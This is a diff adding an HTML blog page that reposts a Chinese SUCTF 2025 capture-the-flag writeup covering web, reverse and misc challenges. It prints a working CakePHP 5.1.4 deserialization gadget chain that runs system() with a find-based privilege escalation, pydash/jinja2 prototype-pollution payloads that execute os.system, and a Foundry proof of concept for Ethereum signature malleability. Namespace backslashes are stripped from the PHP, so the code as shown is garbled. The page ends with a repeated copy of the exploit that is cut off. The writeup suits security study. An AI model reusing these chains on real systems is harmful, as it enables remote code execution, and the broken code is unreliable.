@@ -1,0 +1,462 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SUCTF 2025 writeup by Min-Venom | PUDONG LAB</title><meta name="author" content="朴冬,2559874620@qq.com/tyjiang@stu.xjtu.edu.cn"><meta name="copyright" content="朴冬"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="SUCTF 2025 Min-Venom：cakephp 5.1.4 新链 (RejectedPromise→ConstTypeNode→Table→MockClass) + pydash jinja2 + secp256k1 签名延展性。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SUCTF 2025 writeup by Min-Venom">
+<meta property="og:url" content="https://pudong617.github.io/2025/01/01/ctf-kb/wp/Web/SUCTF_2025_writeup_by_Min-Venom/">
+<meta property="og:site_name" content="PUDONG LAB">
+<meta property="og:description" content="SUCTF 2025 Min-Venom：cakephp 5.1.4 新链 (RejectedPromise→ConstTypeNode→Table→MockClass) + pydash jinja2 + secp256k1 签名延展性。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pudong617.github.io/img/youli.png">
+<meta property="article:published_time" content="2024-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-12-31T16:00:00.000Z">
+<meta property="article:author" content="朴冬">
+<meta property="article:tag" content="cakephp-5.1.4">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pudong617.github.io/img/youli.png"><link rel="shortcut icon" href="/img/PU-LOGO.png"><link rel="canonical" href="https://pudong617.github.io/2025/01/01/ctf-kb/wp/Web/SUCTF_2025_writeup_by_Min-Venom/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SUCTF 2025 writeup by Min-Venom',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2025-01-01 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><style>
+  /* 冷色极光渐变背景：与主题主色 #49B1F5 / #00C4B6 同色系 */
+  html #web_bg {
+    background-color: #F5FAFF;
+    background-image:
+      radial-gradient(1200px 700px at 12% -10%, rgba(73, 177, 245, .55), transparent 60%),
+      radial-gradient(1000px 650px at 92% 15%, rgba(0, 196, 182, .40), transparent 60%),
+      radial-gradient(900px 560px at 68% 108%, rgba(255, 114, 66, .16), transparent 62%),
+      linear-gradient(155deg, #E3F2FF 0%, #F6FBFF 45%, #E4F8F2 100%);
+  }
+  /* 暗色模式：同构图，降低光斑强度 */
+  html[data-theme='dark'] #web_bg {
+    background-color: #0B121A;
+    background-image:
+      radial-gradient(1100px 700px at 10% -8%, rgba(73, 177, 245, .45), transparent 62%),
+      radial-gradient(1000px 620px at 92% 12%, rgba(0, 196, 182, .32), transparent 62%),
+      radial-gradient(800px 520px at 72% 105%, rgba(255, 114, 66, .10), transparent 60%),
+      linear-gradient(160deg, #0B121A 0%, #0C1A24 50%, #0A1E20 100%);
+  }
+</style>
+<link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/youli.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background: radial-gradient(1100px 620px at 18% 8%, rgba(73, 177, 245, .55), transparent 60%), radial-gradient(900px 520px at 82% 22%, rgba(0, 196, 182, .45), transparent 62%), radial-gradient(700px 460px at 55% 108%, rgba(255, 114, 66, .18), transparent 60%), linear-gradient(155deg, #0A1A2B 0%, #0E3049 48%, #083F45 100%)"><nav id="nav"><span id="blog-info"><a href="/" title="PUDONG LAB"><img class="site-icon" src="/img/pudong.png"/></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SUCTF 2025 writeup by Min-Venom</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-12-31T16:00:00.000Z" title="发表于 2025-01-01 00:00:00">2025-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-12-31T16:00:00.000Z" title="更新于 2025-01-01 00:00:00">2025-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/">CTF知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/WP/">WP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/Web/">Web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SUCTF 2025 writeup by Min-Venom"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>原文: <a target="_blank" rel="noopener" href="https://www.ctfiot.com/223976.html">https://www.ctfiot.com/223976.html</a><br>ID: 223976</p>
+</blockquote>
+<p>招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱</p>
+<p><a href="mailto:&#x61;&#x64;&#109;&#105;&#x6e;&#64;&#x63;&#x68;&#97;&#x6d;&#100;&#x35;&#x2e;&#x6f;&#x72;&#103;">&#x61;&#x64;&#109;&#105;&#x6e;&#64;&#x63;&#x68;&#97;&#x6d;&#100;&#x35;&#x2e;&#x6f;&#x72;&#103;</a>(带上简历和想加入的小组)</p>
+<p>Web:</p>
+<p>SU_POP</p>
+<p>cakephp 5.1.4 版本的，参考网上以前版本的链子都不行了，因为加了个 __wakeup() 魔术方法，需要重新找入口，</p>
+<p>发现在 srcInternalRejectedPromise 类的 __destruct 存在字符串拼接并且 reason 参数可控，那么可以调用任意 __tostring 魔术方法，</p>
+<p>然后全局找 __tostring 魔术方法，发现两处可以调用到 __call() 魔术方法，这里选择 srcAstTypeConstTypeNode 类，变量 $constExpr 可控，</p>
+<p>现在需要找到合适的 __call 方法，可以接上老版本的链子， srcORMTable 类的 __call 魔术方法</p>
+<p>同理调用到 call() 方法，依然可以实现调用任意类方法，变量控制逻辑和老版本一样，但只能调用无参方法。利用 seay 工具找了一遍，最后发现 srcFrameworkMockObjectGeneratorMockClass类中的 generate 方法</p>
+<p>构造exp，可以不用引用接口，题目需要find提权。</p>
+<?php  
+namespace PHPUnitFrameworkMockObjectGenerator;  
+interface MockType{}  
+final class MockClass implements MockType{  
+    public $mockName;  
+    public $classCode;  
+    public function  __construct()  
+    {  
+        $this->mockName = "MockClass";  
+        $this->classCode = "system('find /etc/passwd -exec tac /flag.txt ;');";  
+    }  
+  
+}  
+  
+namespace CakeCore;  
+use Countable;  
+use IteratorAggregate;  
+abstract class ObjectRegistry implements Countable, IteratorAggregate{  
+    public $_loaded = [];  
+}  
+namespace CakeValidation;  
+interface ValidatorAwareInterface{}  
+namespace CakeEvent;  
+interface EventListenerInterface{}  
+namespace CakeDatasource;  
+interface RepositoryInterface{}  
+namespace CakeEvent;  
+interface EventDispatcherInterface{}  
+namespace CakeORM;  
+use CakeCoreObjectRegistry;  
+use CakeDatasourceRepositoryInterface;  
+use CakeEventEventDispatcherInterface;  
+use CakeEventEventListenerInterface;  
+use CakeValidationValidatorAwareInterface;  
+use PHPUnitFrameworkMockObjectGeneratorMockClass;  
+use Traversable;  
+class BehaviorRegistry extends ObjectRegistry implements EventDispatcherInterface{  
+    public $_methodMap = [];  
+    public function count(): int{}  
+    public function getIterator(): Traversable{}  
+}  
+class Table implements RepositoryInterface, EventListenerInterface, EventDispatcherInterface, ValidatorAwareInterface  
+{  
+    public BehaviorRegistry $_behaviors;  
+    public function __construct(){  
+        $a=new MockClass();  
+        $this->_behaviors = new BehaviorRegistry();  
+        $this->_behaviors->_methodMap=["__tostring"=>["MockClass","generate"]];  
+        $this->_behaviors->_loaded=["MockClass"=>$a];  
+    }  
+  
+}  
+namespace ReactPromise;  
+interface PromiseInterface{}  
+  
+namespace ReactPromiseInternal;  
+use ReactPromisePromiseInterface;  
+  
+final class RejectedPromise implements PromiseInterface{  
+    public $reason;  
+}  
+namespace PHPStanPhpDocParserAst;  
+interface Node{};  
+  
+namespace PHPStanPhpDocParserAstType;  
+use PHPStanPhpDocParserAstNode;  
+interface TypeNode extends Node  
+{  
+}  
+  
+namespace PHPStanPhpDocParserAstType;  
+use CakeORMTable;  
+use ReactPromiseInternalRejectedPromise;  
+  
+class ConstTypeNode implements TypeNode{  
+    public $constExpr;  
+}  
+  
+  
+$pop = new RejectedPromise();  
+$pop->reason=new ConstTypeNode();  
+$pop->reason->constExpr=new Table();  
+echo base64_encode(serialize($pop));
+
+ SU_blog
+
+登陆后发现有file参数，可以实现目录穿越读取任意文件，绕过一下../，获得源码
+
+然后继续读取waf.py，利用../绕过关键字。在源码看到存在pydash原型链污染，搜索一下发现可以利用 jinja2 编译模板时的包 rce，网上payload
+
+{"name":"__init__.__globals__.__loader__.__init__.__globals__.sys.modules.jinja2.runtime.exported.0","value":"*;import os;os.system('id')"}
+
+这里有 waf 需要绕一下，数字索引还有 2 可以利用，然后通过写文件获得回显，构造
+
+{"key": ".__init__.__globals__.t.NamedTuple.__globals__.sys.modules.jinja2.runtime.exported[2]","value": "*;import os;os.system('/read* >/tmp/gaoren.txt')"}
+
+最后成功命令执行，这里编译包是只有第一次渲染时才会调用的，所以选择 2 分钟的容器并且多访问几个页面。最后获得flag
+
+ Reverse:
+
+SU_BBRE
+
+从给到的txt文本中不难分析出分别有两段加密逻辑，func2对应的是无魔改RC4，密钥是“suctf”
+
+第二段直接定位到func1中，不难看出有个下标相加的操作
+
+data=[0x41,0x6D,0x62,0x4D,0x53,0x49,0x4E,0x29,0x28]
+for i in range(len(data)):
+    print(chr(data[i]+i),end='')
+#AndPWNT00
+
+然而将两端flag拼接起来之后还是不太对，flag给的大概意思，本题有pwn的知识点，还有就是程序控制流是怎么到的function1，那么即是从输入的时候有个栈溢出的操作从而劫持了控制流到func1，故而两段flag之间还应该添加func1目标函数的地址才是最后的flag，注意端序问题，调换以下顺序
+
+拼接起来即可：
+SUCTF{We1com3ToReWorld="@AndPWNT00}
+
+ Misc:
+
+Onchain Magician
+
+源码：
+
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity 0.8.28;
+
+contract MagicBox {
+ struct Signature {
+ uint8 v;
+ bytes32 r;
+ bytes32 s;
+ }
+
+ address magician;
+ bytes32 alreadyUsedSignatureHash;
+ bool isOpened;
+
+ constructor() {}
+
+ function isSolved() public view returns (bool) {
+ return isOpened;
+ }
+
+ function getMessageHash(address _magician) public view returns (bytes32) {
+ return keccak256(abi.encodePacked("I want to open the magic box", _magician, address(this), block.chainid));
+ }
+
+ function _getSignerAndSignatureHash(Signature memory _signature) internal view returns (address, bytes32) {
+ address signer = ecrecover(getMessageHash(msg.sender), _signature.v, _signature.r, _signature.s);
+ bytes32 signatureHash = keccak256(abi.encodePacked(_signature.v, _signature.r, _signature.s));
+ return (signer, signatureHash);
+ }
+
+ function signIn(Signature memory signature) external {
+ require(magician == address(0), "Magician already signed in");
+ (address signer, bytes32 signatureHash) = _getSignerAndSignatureHash(signature);
+ require(signer == msg.sender, "Invalid signature");
+ magician = signer;
+ alreadyUsedSignatureHash = signatureHash;
+ }
+
+ function openBox(Signature memory signature) external {
+ require(magician == msg.sender, "Only magician can open the box");
+ (address signer, bytes32 signatureHash) = _getSignerAndSignatureHash(signature);
+ require(signer == msg.sender, "Invalid signature");
+ require(signatureHash != alreadyUsedSignatureHash, "Signature already used");
+ isOpened = true;
+ }
+}
+
+分析：和其他的合约 ctf 一样，调用 openBox函数成功使得 isOpened为 ture 即可拿到 flag。
+大致一看，这道题需要我们签署原始交易，获得 v, r, s 的值。
+•getMessageHash：该函数用于构造合约预期的 message 摘要
+•_getSignerAndSignatureHash：内部函数，用于还原签名的签署者，以及获得签名的哈希
+•signIn：传递签名（这里要求我们 msg.sender 和还原出来的签名地址相同，同时在此之前没有调用过该函数），设置 magician = signer
+•openBox：传递签名，想要调用成功，需要与上一次调用signIn的 signer 相同，同时签名的哈希不同。
+大致分析后，我们可以知道：每个人（signer）的交易哈希都只有一个，但是我们需要有两个不同的有效签名。这个实际上是以太坊的签名拓展性攻击漏洞。
+简单来说：由于以太坊底层使用的是 Secp256K1 椭圆曲线，该椭圆曲线，对于一个签名，有两个有效的 s 值。所以，通过构造，我们得到另一个有效的 s 值，将这个 s 值作为调用openBox中传递即可。
+完整 Poc：
+
+import {Script, console2} from "forge-std/Script.sol";
+import {MagicBox} from "../src/MagicBox.sol";
+
+contract Attack is Script {
+ function run() external {
+ MagicBox target = MagicBox(vm.envAddress("target"));
+ // secp256k1 曲线的阶 n
+ uint256 n = uint256(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141);
+
+ vm.startBroadcast();
+ bytes32 MessageHash = target.getMessageHash(vm.envAddress("account"));
+ vm.stopBroadcast();
+
+ (uint8 v, bytes32 r, bytes32 s) = vm.sign(vm.envUint("key"), MessageHash);
+ v = 28;
+ MagicBox.Signature memory signature1 = MagicBox.Signature(v, r, s);
+
+ MagicBox.Signature memory signature2 = MagicBox.Signature(27, r, bytes32(n - uint256(s)));
+
+ vm.startBroadcast();
+ target.signIn(signature1);
+ target.openBox(signature2);
+ vm.stopBroadcast();
+ }
+}
+
+flag：SUCTF{C0n9r4ts!Y0u're_An_0ut5taNd1ng_OnchA1n_Ma9ic1an.}
+
+real_checkin
+
+一开始尝试用emoji解码无果
+
+观察了一下几个表情的英文翻译之后，知道直接取每一个表情的英文开头第一个字符即是flag
+
+🐍☂️🐈🌮🍟分别对应以下：
+snake
+umbrellla
+cat
+taco
+fries
+取第一个字符得到suctf，依次类推得到：
+suctf{welcome_to_suctf_you_can_really_dance}
+
+Onchain Checkin
+
+下载附件后打开源码，是个很简单的 Solana 程序。flag 在 Solana explorer 上都能查到。
+
+这里是 program 的地址。explorer 上查询到如下数据：
+
+这两个有一个是测试数据：
+
+另一个是对的
+
+但是这里只有两个
+
+另一个看源码这里：
+
+这里提到了 account3 的公钥。试了下 base58 也能解出来：
+
+拼一下：
+
+结束
+
+招新小广告
+
+ChaMd5 Venom 招收大佬入圈
+
+新成立组IOT+工控+样本分析 长期招新
+
+欢迎联系admin@chamd5.org
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">namespace PHPUnitFrameworkMockObjectGenerator;  </span><br><span class="line">interface MockType&#123;&#125;  </span><br><span class="line">final class MockClass implements MockType&#123;  </span><br><span class="line">    public $mockName;  </span><br><span class="line">    public $classCode;  </span><br><span class="line">    public function  __construct()  </span><br><span class="line">    &#123;  </span><br><span class="line">        $this-&gt;mockName = &quot;MockClass&quot;;  </span><br><span class="line">        $this-&gt;classCode = &quot;system(&#x27;find /etc/passwd -exec tac /flag.txt ;&#x27;);&quot;;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">namespace CakeCore;  </span><br><span class="line">use Countable;  </span><br><span class="line">use IteratorAggregate;  </span><br><span class="line">abstract class ObjectRegistry implements Countable, IteratorAggregate&#123;  </span><br><span class="line">    public $_loaded = [];  </span><br><span class="line">&#125;  </span><br><span class="line">namespace CakeValidation;  </span><br><span class="line">interface ValidatorAwareInterface&#123;&#125;  </span><br><span class="line">namespace CakeEvent;  </span><br><span class="line">interface EventListenerInterface&#123;&#125;  </span><br><span class="line">namespace CakeDatasource;  </span><br><span class="line">interface RepositoryInterface&#123;&#125;  </span><br><span class="line">namespace CakeEvent;  </span><br><span class="line">interface EventDispatcherInterface&#123;&#125;  </span><br><span class="line">namespace CakeORM;  </span><br><span class="line">use CakeCoreObjectRegistry;  </span><br><span class="line">use CakeDatasourceRepositoryInterface;  </span><br><span class="line">use CakeEventEventDispatcherInterface;  </span><br><span class="line">use CakeEventEventListenerInterface;  </span><br><span class="line">use CakeValidationValidatorAwareInterface;  </span><br><span class="line">use PHPUnitFrameworkMockObjectGeneratorMockClass;  </span><br><span class="line">use Traversable;  </span><br><span class="line">class BehaviorRegistry extends ObjectRegistry implements EventDispatcherInterface&#123;  </span><br><span class="line">    public $_methodMap = [];  </span><br><span class="line">    public function count(): int&#123;&#125;  </span><br><span class="line">    public function getIterator(): Traversable&#123;&#125;  </span><br><span class="line">&#125;  </span><br><span class="line">class Table implements RepositoryInterface, EventListenerInterface, EventDispatcherInterface, ValidatorAwareInterface  </span><br><span class="line">&#123;  </span><br><span class="line">    public BehaviorRegistry $_behaviors;  </span><br><span class="line">    public function __construct()&#123;  </span><br><span class="line">        $a=new MockClass();  </span><br><span class="line">        $this-&gt;_behaviors = new BehaviorRegistry();  </span><br><span class="line">        $this-&gt;_behaviors-&gt;_methodMap=[&quot;__tostring&quot;=&gt;[&quot;MockClass&quot;,&quot;generate&quot;]];  </span><br><span class="line">        $this-&gt;_behaviors-&gt;_loaded=[&quot;MockClass&quot;=&gt;$a];  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line">namespace ReactPromise;  </span><br><span class="line">interface PromiseInterface&#123;&#125;  </span><br><span class="line">  </span><br><span class="line">namespace ReactPromiseInternal;  </span><br><span class="line">use ReactPromisePromiseInterface;  </span><br><span class="line">  </span><br><span class="line">final class RejectedPromise implements PromiseInterface&#123;  </span><br><span class="line">    public $reason;  </span><br><span class="line">&#125;  </span><br><span class="line">namespace PHPStanPhpDocParserAst;  </span><br><span class="line">interface Node&#123;&#125;;  </span><br><span class="line">  </span><br><span class="line">namespace PHPStanPhpDocParserAstType;  </span><br><span class="line">use PHPStanPhpDocParserAstNode;  </span><br><span class="line">interface TypeNode extends Node  </span><br><span class="line">&#123;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">namespace PHPStanPhpDocParserAstType;  </span><br><span class="line">use CakeORMTable;  </span><br><span class="line">use ReactPromiseInternalRejectedPromise;  </span><br><span class="line">  </span><br><span class="line">class ConstTypeNode implements TypeNode&#123;  </span><br><span class="line">    public $constExpr;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">$pop = new RejectedPromise();  </span><br><span class="line">$pop-&gt;reason=new ConstTypeNode();  </span><br><span class="line">$pop-&gt;reason-&gt;constExpr=new Table();  </span><br><span class="line">echo base64_encode(serialize($pop));</span><br><span class="line">&#123;&quot;name&quot;:&quot;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.jinja2.runtime.exported.0&quot;,&quot;value&quot;:&quot;*;import 